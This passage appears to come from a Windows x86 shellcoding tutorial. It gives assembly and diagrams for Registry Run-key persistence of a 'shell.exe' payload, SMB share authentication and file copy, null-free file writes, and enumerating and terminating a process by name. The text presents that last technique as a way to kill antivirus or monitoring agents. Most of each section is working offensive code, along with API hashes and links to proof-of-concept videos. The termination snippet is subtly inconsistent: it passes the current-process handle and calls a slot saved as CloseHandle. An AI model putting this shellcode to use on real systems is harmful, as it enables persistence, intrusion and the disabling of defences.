<text x="610" y="80" fill="#8b949e" font-size="10">Resulting string</text>
<rect x="130" y="88" width="130" height="22" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
<text x="195" y="104" fill="#ff3366" font-size="10" text-anchor="middle" font-weight="bold">push 0x74666f53</text>
<text x="600" y="104" fill="#00ff88" font-size="10" text-anchor="middle">"Soft"</text>
<text x="40" y="104" fill="#8b949e" font-size="9">last</text>
<rect x="130" y="113" width="130" height="22" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="195" y="129" fill="#e0e7ff" font-size="10" text-anchor="middle">push 0x65726177</text>
<text x="600" y="129" fill="#e0e7ff" font-size="10" text-anchor="middle">"ware"</text>
<rect x="130" y="138" width="130" height="22" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="195" y="154" fill="#e0e7ff" font-size="10" text-anchor="middle">push 0x63694d5c</text>
<text x="600" y="154" fill="#e0e7ff" font-size="10" text-anchor="middle">"\Mic"</text>
<rect x="130" y="163" width="130" height="22" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="195" y="179" fill="#e0e7ff" font-size="10" text-anchor="middle">push 0x6f736f72</text>
<text x="600" y="179" fill="#e0e7ff" font-size="10" text-anchor="middle">"roso"</text>
<rect x="130" y="188" width="130" height="22" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="195" y="204" fill="#e0e7ff" font-size="10" text-anchor="middle">push 0x575c7466</text>
<text x="600" y="204" fill="#e0e7ff" font-size="10" text-anchor="middle">"ft\W"</text>
<rect x="130" y="213" width="130" height="22" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="195" y="229" fill="#e0e7ff" font-size="10" text-anchor="middle">...</text>
<text x="600" y="229" fill="#8b949e" font-size="10" text-anchor="middle">"indo" "ws\C" ...</text>
<rect x="130" y="238" width="130" height="22" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="195" y="254" fill="#e0e7ff" font-size="10" text-anchor="middle">push 0x75525c6e</text>
<text x="600" y="254" fill="#e0e7ff" font-size="10" text-anchor="middle">"n\Ru"</text>
<rect x="130" y="263" width="130" height="22" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
<text x="195" y="279" fill="#ff6b35" font-size="10" text-anchor="middle">push "n\0\0\0"</text>
<text x="600" y="279" fill="#ff6b35" font-size="10" text-anchor="middle">"n" + null term</text>
<text x="40" y="279" fill="#8b949e" font-size="9">first</text>
<!-- Arrow showing ESP/EDI -->
<line x1="270" y1="97" x2="310" y2="97" stroke="#00ff88" stroke-width="2" marker-end="url(#ah17s)"/>
<text x="340" y="101" fill="#00ff88" font-size="10">EDI = ESP (start of string)</text>
<!-- Result -->
<rect x="100" y="305" width="550" height="30" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="375" y="325" fill="#00ff88" font-size="11" text-anchor="middle" font-weight="bold">Software\Microsoft\Windows\CurrentVersion\Run</text>
<text x="375" y="360" fill="#8b949e" font-size="10" text-anchor="middle">Reading from EDI forward gives the correct ASCII path (little-endian byte order)</text>
</svg></div>

*Figure 17.2 - Each DWORD push adds 4 characters of the registry path. Because the stack grows downward, pushing in reverse order means EDI (pointing to ESP after all pushes) gives the correct forward-reading string.*

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs><marker id="ah17" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
<rect width="750" height="260" rx="8" fill="#0a0e17"/>
<text x="375" y="30" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Registry Persistence Flow</text>
<rect x="40" y="55" width="160" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="120" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">LoadLibraryA</text>
<text x="120" y="92" fill="#ff6b35" font-size="10" text-anchor="middle">("advapi32.dll")</text>
<line x1="200" y1="80" x2="235" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah17)"/>
<rect x="240" y="55" width="170" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="325" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">RegOpenKeyExA</text>
<text x="325" y="92" fill="#ff6b35" font-size="10" text-anchor="middle">(HKCU, Run key)</text>
<line x1="410" y1="80" x2="445" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah17)"/>
<rect x="450" y="55" width="170" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
<text x="535" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">RegSetValueExA</text>
<text x="535" y="92" fill="#ff3366" font-size="10" text-anchor="middle">("Updater", path)</text>
<rect x="200" y="140" width="350" height="50" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="375" y="160" fill="#e0e7ff" font-size="10" text-anchor="middle">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</text>
<rect x="240" y="167" width="270" height="18" rx="5" fill="#0d1117" stroke="#00d4ff" stroke-width="0.5"/>
<text x="375" y="180" fill="#00ff88" font-size="10" text-anchor="middle">"Updater" = "C:\shell.exe"</text>
<text x="375" y="230" fill="#ff6b35" font-size="11" text-anchor="middle">On next login: Windows runs C:\shell.exe</text>
</svg></div>

*Figure 17.1 - Registry persistence: open the Run key, write the payload path, reboot triggers execution*

With persistence and advanced injection behind us, the final sections cover file operations followed by a complete development workflow and closing thoughts.

### PoC Video

The following video demonstrates the registry persistence shellcode creating a Run key entry that survives system reboots in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/registry-persistence-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Registry Run key persistence surviving reboot*

---

## 18. SMB File Operations: Network File Access

Our goal is to authenticate to a remote SMB share and copy a file -- all from position-independent assembly. We need **WNetAddConnection2A** from **mpr.dll** and **CopyFileA** from kernel32.

### Loading mpr.dll

```nasm
load_mpr_dll:
    xor   eax, eax
    push  eax                   ; Null terminator
    xor   eax, eax
    mov   ax, 0x6c6c
    shl   eax, 0x08
    mov   al, 0x64              ; EAX = 0x006c6c64 = "dll\0"
    push  eax
    push  0x2e72706d            ; "mpr."
    mov   esi, esp
    push  esi
    call  dword ptr [ebp+0x10]  ; LoadLibraryA("mpr.dll")
```

### NETRESOURCEA Struct Layout

Build the 32-byte struct with `dwType = 1` (RESOURCETYPE_DISK) and `lpRemoteName` pointing to the UNC path on the stack.

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<rect width="750" height="300" rx="8" fill="#0a0e17"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">NETRESOURCEA Struct (32 bytes on stack)</text>
<!-- Struct fields -->
<rect x="80" y="50" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="90" y="70" fill="#00d4ff" font-size="11">+0x00  dwScope</text>
<text x="300" y="70" fill="#8b949e" font-size="10" text-anchor="end">= 0</text>
<rect x="80" y="84" width="260" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="90" y="104" fill="#ff3366" font-size="11" font-weight="bold">+0x04  dwType</text>
<text x="300" y="104" fill="#ff3366" font-size="10" text-anchor="end">= 1 (DISK)</text>
<rect x="80" y="118" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="90" y="138" fill="#00d4ff" font-size="11">+0x08  dwDisplayType</text>
<text x="300" y="138" fill="#8b949e" font-size="10" text-anchor="end">= 0</text>
<rect x="80" y="152" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="90" y="172" fill="#00d4ff" font-size="11">+0x0C  dwUsage</text>
<text x="300" y="172" fill="#8b949e" font-size="10" text-anchor="end">= 0</text>
<rect x="80" y="186" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="90" y="206" fill="#00d4ff" font-size="11">+0x10  lpLocalName</text>
<text x="300" y="206" fill="#8b949e" font-size="10" text-anchor="end">= NULL</text>
<rect x="80" y="220" width="260" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="90" y="240" fill="#00ff88" font-size="11" font-weight="bold">+0x14  lpRemoteName</text>
<text x="300" y="240" fill="#00ff88" font-size="10" text-anchor="end">--> UNC ptr</text>
<!-- UNC string -->
<line x1="340" y1="235" x2="420" y2="235" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="4,3"/>
<rect x="420" y="220" width="280" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
<text x="560" y="240" fill="#00ff88" font-size="11" text-anchor="middle">\\192.168.1.1\share</text>
<rect x="80" y="254" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="90" y="274" fill="#00d4ff" font-size="11">+0x18  lpComment</text>
<text x="300" y="274" fill="#8b949e" font-size="10" text-anchor="end">= NULL</text>
<rect x="420" y="50" width="280" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
<text x="560" y="70" fill="#ff6b35" font-size="11" text-anchor="middle" font-weight="bold">WNetAddConnection2A args:</text>
<text x="560" y="90" fill="#e0e7ff" font-size="10" text-anchor="middle">(&nr, "password", "user", 0)</text>
</svg></div>

*Figure 18.2 - The NETRESOURCEA struct layout. Only dwType and lpRemoteName need non-zero values for SMB authentication.*

Then authenticate with `WNetAddConnection2A` and copy with `CopyFileA`.

<div align="center"><svg width="750" height="240" viewBox="0 0 750 240" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs><marker id="ah18" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
<rect width="750" height="240" rx="8" fill="#0a0e17"/>
<text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">SMB File Copy Sequence</text>
<rect x="30" y="55" width="155" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="107" y="78" text-anchor="middle" fill="#e0e7ff" font-size="11">LoadLibraryA</text>
<text x="107" y="95" text-anchor="middle" fill="#ff6b35" font-size="10">("mpr.dll")</text>
<line x1="185" y1="82" x2="225" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ah18)"/>
<rect x="230" y="55" width="185" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="322" y="78" text-anchor="middle" fill="#e0e7ff" font-size="11">WNetAddConnection2A</text>
<text x="322" y="95" text-anchor="middle" fill="#ff6b35" font-size="10">(&nr, pass, user, 0)</text>
<line x1="415" y1="82" x2="455" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ah18)"/>
<rect x="460" y="55" width="155" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="537" y="78" text-anchor="middle" fill="#e0e7ff" font-size="11">CopyFileA</text>
<text x="537" y="95" text-anchor="middle" fill="#ff6b35" font-size="10">(local, remote, FALSE)</text>
<rect x="220" y="145" width="310" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="375" y="170" text-anchor="middle" fill="#00ff88" font-size="11">ExitProcess(0) -- Clean shutdown</text>
<text x="375" y="220" text-anchor="middle" fill="#e0e7ff" font-size="10" font-style="italic">Each arrow = stdcall: push args right-to-left, call, callee cleans stack</text>
</svg></div>

*Figure 18.1 - SMB file copy sequence: load DLL, authenticate, copy, exit*

### PoC Video

The following video demonstrates the SMB file operations shellcode reading and writing files over the network in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/smb-file-ops-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: SMB file read/write over network share*

---

## 19. File I/O: Writing to Disk

Three kernel32 APIs: **CreateFileA**, **WriteFile**, **CloseHandle**.

### Null-Free Access Flag Construction

We need `GENERIC_READ | GENERIC_WRITE` = `0xC0000000`. That value is loaded with nulls, so we use a bit shift.

```nasm
    xor   ebx, ebx
    mov   bl,  0x03             ; EBX = 0x03
    shl   ebx, 30              ; EBX = 0xC0000000 = GENERIC_READ | GENERIC_WRITE
```

`0x03` shifted left by 30 bits puts the two set bits at positions 30 and 31 -- exactly `GENERIC_READ | GENERIC_WRITE`.

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<rect width="750" height="220" rx="8" fill="#0a0e17"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Bit-Shift Access Flag Construction</text>
<!-- Before -->
<text x="60" y="65" fill="#ff6b35" font-size="12">Before (0x03):</text>
<rect x="200" y="50" width="500" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="220" y="69" fill="#8b949e" font-size="10">31  30  29  28  27  ...  3   2   1   0</text>
<rect x="200" y="80" width="500" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
<text x="220" y="99" fill="#8b949e" font-size="11"> 0   0   0   0   0  ...  0</text>
<text x="660" y="99" fill="#00ff88" font-size="11" font-weight="bold"> 1   1</text>
<!-- SHL arrow -->
<text x="375" y="125" fill="#ff3366" font-size="12" text-anchor="middle" font-weight="bold">SHL 30  (shift left by 30 positions)</text>
<!-- After -->
<text x="60" y="158" fill="#00ff88" font-size="12">After (0xC0000000):</text>
<rect x="200" y="143" width="500" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="220" y="162" fill="#8b949e" font-size="10">31  30  29  28  27  ...  3   2   1   0</text>
<rect x="200" y="173" width="500" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="220" y="192" fill="#00ff88" font-size="11" font-weight="bold"> 1   1</text>
<text x="310" y="192" fill="#8b949e" font-size="11">  0   0   0  ...  0   0   0   0</text>
<text x="280" y="210" fill="#8b949e" font-size="9">GR  GW</text>
</svg></div>

*Figure 19.2 - The two low bits of 0x03 land at positions 31 (GENERIC_READ) and 30 (GENERIC_WRITE) after a 30-bit left shift, producing 0xC0000000 with no null bytes.*

### Writing and Closing

```nasm
call_writefile:
    mov   ebx, eax              ; Save hFile
    ; Push message string as DWORDs, then:
    push  edi                   ; lpNumberOfBytesWritten
    push  0x1C                  ; 28 bytes
    push  esi                   ; lpBuffer
    push  ebx                   ; hFile
    call  dword ptr [ebp+0x1C] ; WriteFile

call_closehandle:
    push  ebx
    call  dword ptr [ebp+0x20] ; CloseHandle(hFile)
```

<div align="center"><svg width="750" height="200" viewBox="0 0 750 200" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs><marker id="ah19" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
<rect width="750" height="200" rx="8" fill="#0a0e17"/>
<text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">File I/O Sequence</text>
<rect x="30" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="120" y="78" text-anchor="middle" fill="#e0e7ff" font-size="12">CreateFileA</text>
<text x="120" y="95" text-anchor="middle" fill="#ff6b35" font-size="10">0xC0000000 via shl</text>
<line x1="210" y1="82" x2="265" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ah19)"/>
<rect x="270" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="360" y="78" text-anchor="middle" fill="#e0e7ff" font-size="12">WriteFile</text>
<text x="360" y="95" text-anchor="middle" fill="#ff6b35" font-size="10">hFile, buf, len</text>
<line x1="450" y1="82" x2="505" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ah19)"/>
<rect x="510" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="600" y="78" text-anchor="middle" fill="#e0e7ff" font-size="12">CloseHandle</text>
<text x="600" y="95" text-anchor="middle" fill="#00ff88" font-size="10">Flush + release</text>
<text x="375" y="150" text-anchor="middle" fill="#e0e7ff" font-size="11">TerminateProcess(-1, 0) -- clean exit via current process pseudo-handle</text>
</svg></div>

*Figure 19.1 - File I/O: create, write, close, terminate*

### PoC Video

The following video demonstrates the file I/O shellcode creating and writing data to a file on disk in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/file-io-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: File creation and write to disk*

---

## 20. Process Termination: Killing a Target Process

Sometimes the goal is not to connect, persist, or download -- it is to **kill a running process**. An attacker might terminate an antivirus service, or a red-team operator might shut down a monitoring agent. This shellcode demonstrates the Toolhelp32 API: enumerate every running process, match a target by name, and terminate it.

<div align="center"><svg viewBox="0 0 750 370" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="370" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Process Termination Flow</text>
  <!-- Step 1: Snapshot -->
  <rect x="30" y="55" width="190" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="125" y="77" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">1. Snapshot</text>
  <text x="125" y="97" text-anchor="middle" fill="#e0e7ff" font-size="10">CreateToolhelp32Snapshot</text>
  <!-- Arrow -->
  <line x1="220" y1="82" x2="255" y2="82" stroke="#00ff88" stroke-width="1.5"/>
  <polygon points="252,78 259,82 252,86" fill="#00ff88"/>
  <!-- Step 2: First -->
  <rect x="260" y="55" width="170" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="345" y="77" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">2. First Entry</text>
  <text x="345" y="97" text-anchor="middle" fill="#e0e7ff" font-size="10">Process32First</text>
  <!-- Arrow down -->
  <line x1="345" y1="110" x2="345" y2="140" stroke="#00ff88" stroke-width="1.5"/>
  <polygon points="341,137 345,144 349,137" fill="#00ff88"/>
  <!-- Step 3: Compare -->
  <rect x="240" y="145" width="210" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="345" y="167" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">3. Compare Name</text>
  <text x="345" y="187" text-anchor="middle" fill="#e0e7ff" font-size="10">szExeFile == "notepad.exe" ?</text>
  <!-- No branch: right to Process32Next -->
  <line x1="450" y1="172" x2="520" y2="172" stroke="#ff3366" stroke-width="1.5"/>
  <polygon points="517,168 524,172 517,176" fill="#ff3366"/>
  <text x="485" y="164" text-anchor="middle" fill="#ff3366" font-size="10">NO</text>
  <rect x="525" y="145" width="170" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="610" y="167" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Process32Next</text>
  <text x="610" y="187" text-anchor="middle" fill="#e0e7ff" font-size="10">Advance to next entry</text>
  <!-- Loop back from Process32Next to Compare -->
  <path d="M 610,200 C 610,230 345,230 345,200" fill="none" stroke="#00d4ff" stroke-width="1.5" stroke-dasharray="6,3"/>
  <polygon points="341,203 345,196 349,203" fill="#00d4ff"/>
  <text x="477" y="225" text-anchor="middle" fill="#00d4ff" font-size="9">loop</text>
  <!-- Yes branch: down to OpenProcess -->
  <line x1="345" y1="200" x2="345" y2="245" stroke="#00ff88" stroke-width="2"/>
  <polygon points="341,242 345,249 349,242" fill="#00ff88"/>
  <text x="358" y="232" fill="#00ff88" font-size="10">YES</text>
  <rect x="220" y="250" width="250" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="345" y="272" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">4. OpenProcess</text>
  <text x="345" y="292" text-anchor="middle" fill="#e0e7ff" font-size="10">PROCESS_TERMINATE | pid</text>
  <!-- Arrow down to TerminateProcess -->
  <line x1="345" y1="305" x2="345" y2="325" stroke="#00ff88" stroke-width="2"/>
  <polygon points="341,322 345,329 349,322" fill="#00ff88"/>
  <rect x="220" y="325" width="250" height="35" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="345" y="348" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">5. TerminateProcess(handle, 0)</text>
</svg></div>

*Figure 20.1 - Process termination flow: snapshot the process list, walk entries comparing names, then open and terminate the match.*

### Required APIs

All six functions come from **kernel32.dll** -- no additional DLLs to load:

| API | ROR-13 Hash | Purpose |
|---|---|---|
| `TerminateProcess` | `0x78b5b983` | Kill the target process |
| `CreateToolhelp32Snapshot` | `0xe454dfed` | Snapshot the process list |
| `Process32First` | `0x3249baa7` | Get first PROCESSENTRY32 |
| `Process32Next` | `0x4776654a` | Get next PROCESSENTRY32 |
| `OpenProcess` | `0xefe297c0` | Obtain a handle with kill rights |
| `CloseHandle` | `0x0ffd97fb` | Release the handle |

### Resolving the APIs

After the standard PEB walk and find_function setup, we resolve all six:

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983            ; TerminateProcess hash
    call  dword ptr [ebp+0x04]  ; Call find_function
    mov   [ebp+0x10], eax       ; Save TerminateProcess

    push  0xe454dfed            ; CreateToolhelp32Snapshot hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax       ; Save CreateToolhelp32Snapshot

    push  0x3249baa7            ; Process32First hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax       ; Save Process32First

    push  0x4776654a            ; Process32Next hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax       ; Save Process32Next

    push  0xefe297c0            ; OpenProcess hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax       ; Save OpenProcess

    push  0x0ffd97fb            ; CloseHandle hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax       ; Save CloseHandle
```

### Taking the Snapshot

`CreateToolhelp32Snapshot` with `TH32CS_SNAPPROCESS` (0x02) and process ID 0 returns a handle to a snapshot of all running processes:

```nasm
call_createtoolhelp32snapshot:
    xor   eax, eax              ; EAX = 0
    push  eax                   ; th32ProcessID = 0 (all processes)
    inc   eax                   ; EAX = 1
    inc   eax                   ; EAX = 2 (TH32CS_SNAPPROCESS)
    push  eax                   ; dwFlags = 2
    call  dword ptr [ebp+0x14]  ; CreateToolhelp32Snapshot(2, 0)
    mov   [ebp+0x2C], eax       ; Save snapshot handle
```

### Allocating PROCESSENTRY32

The struct is 556 bytes (0x22C). We zero-allocate it on the stack and set the required `dwSize` field:

```nasm
set_struct_size:
    xor   eax, eax              ; EAX = 0
    xor   ecx, ecx              ; ECX = 0
    mov   cx,  0x22C            ; ECX = 556 (sizeof PROCESSENTRY32)

allocate_struct:
    push  eax                   ; Push 4 zero bytes
    sub   ecx, 0x04             ; Counter -= 4
    jnz   allocate_struct       ; Loop until all 556 bytes allocated
    mov   edi, esp              ; EDI = pointer to PROCESSENTRY32

set_req_parameters:
    xor   eax, eax              ; EAX = 0
    mov   ax,  0x22C            ; EAX = 0x22C
    mov   [edi], eax            ; dwSize = 0x22C (required!)
```

<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s52" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s52"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s52" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="320" rx="10" fill="url(#bg_s52)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s52)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s52)">PROCESSENTRY32 Struct Layout (556 bytes / 0x22C)</text>
  <!-- Struct bar -->
  <rect x="40" y="55" width="670" height="40" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="375" y="80" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">PROCESSENTRY32 (EDI points here on the stack)</text>
  <!-- Fields -->
  <rect x="40" y="105" width="120" height="50" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="100" y="125" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">dwSize</text>
  <text x="100" y="145" text-anchor="middle" fill="#e0e7ff" font-size="9">+0x00 (4B)</text>
  <rect x="165" y="105" width="100" height="50" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="215" y="125" text-anchor="middle" fill="#8b949e" font-size="10">cntUsage</text>
  <text x="215" y="145" text-anchor="middle" fill="#8b949e" font-size="9">+0x04 (4B)</text>
  <rect x="270" y="105" width="140" height="50" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="125" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">th32ProcessID</text>
  <text x="340" y="145" text-anchor="middle" fill="#e0e7ff" font-size="9">+0x08 (4B)</text>
  <rect x="415" y="105" width="100" height="50" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="465" y="125" text-anchor="middle" fill="#8b949e" font-size="10">...</text>
  <text x="465" y="145" text-anchor="middle" fill="#8b949e" font-size="9">+0x0C-0x20</text>
  <rect x="520" y="105" width="190" height="50" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="615" y="125" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">cntThreads</text>
  <text x="615" y="145" text-anchor="middle" fill="#8b949e" font-size="9">+0x20 (4B)</text>
  <!-- szExeFile row -->
  <rect x="40" y="170" width="670" height="55" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
  <text x="375" y="193" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">szExeFile[MAX_PATH]</text>
  <text x="375" y="215" text-anchor="middle" fill="#e0e7ff" font-size="11">Offset +0x24  |  260 bytes (MAX_PATH)  |  Process name lives HERE</text>
  <!-- Notes -->
  <rect x="80" y="245" width="590" height="55" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="267" text-anchor="middle" fill="#e0e7ff" font-size="11">dwSize MUST be set to 0x22C before calling Process32First.</text>
  <text x="375" y="287" text-anchor="middle" fill="#ff6b35" font-size="10">We compare [edi+0x24] against our target string "notepad.exe" byte by byte.</text>
</svg></div>

*Figure 20.2 - The PROCESSENTRY32 struct. The two fields we care about: `th32ProcessID` at offset +0x08 (the PID to pass to OpenProcess) and `szExeFile` at offset +0x24 (the process name to compare).*

### Walking the Process List

`Process32First` retrieves the first entry. Then we build the target string `"notepad.exe"` on the stack using the same SHL trick from Section 6:

```nasm
call_process32first:
    push  edi                   ; lppe = &PROCESSENTRY32
    push  [ebp+0x2C]            ; hSnapshot
    call  dword ptr [ebp+0x18]  ; Process32First(hSnapshot, &pe32)

create_notepad_string:
    xor   eax, eax              ; EAX = 0
    mov   ax,  0x6578           ; "xe"
    shl   eax, 0x08             ; EAX = 0x00657800
    mov   al,  0x65             ; EAX = 0x00657865 = "exe\0"
    push  eax                   ; Push "exe\0"
    push  0x2e646170            ; Push "pad."
    push  0x65746f6e            ; Push "note"
    mov   [ebp+0x30], esp       ; Save pointer to "notepad.exe"
```

### The Detection Loop

The detection loop compares each process name in `szExeFile` (at `edi+0x24`) against our target string character by character. On a mismatch it calls `Process32Next` to advance to the next entry and loops. When all characters match, it falls through to the kill sequence:

```nasm
detection_loop:
    xor   ecx, ecx              ; ECX = 0 (byte index)
    ; Compare szExeFile[ecx] against target[ecx] byte by byte
    ; On mismatch: call Process32Next, loop back
    ; On full match: fall through to open + terminate
```

### The Kill

Once the target PID is found at `[edi+0x08]`, we open the process with `PROCESS_TERMINATE` rights and call `TerminateProcess`:

```nasm
call_terminateprocess:
    xor   eax, eax              ; EAX = 0
    push  eax                   ; uExitCode = 0
    dec   eax                   ; EAX = -1 (current process handle placeholder)
    push  eax                   ; hProcess
    call  dword ptr [ebp+0x24]  ; TerminateProcess(handle, 0)
```

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s53" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s53"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
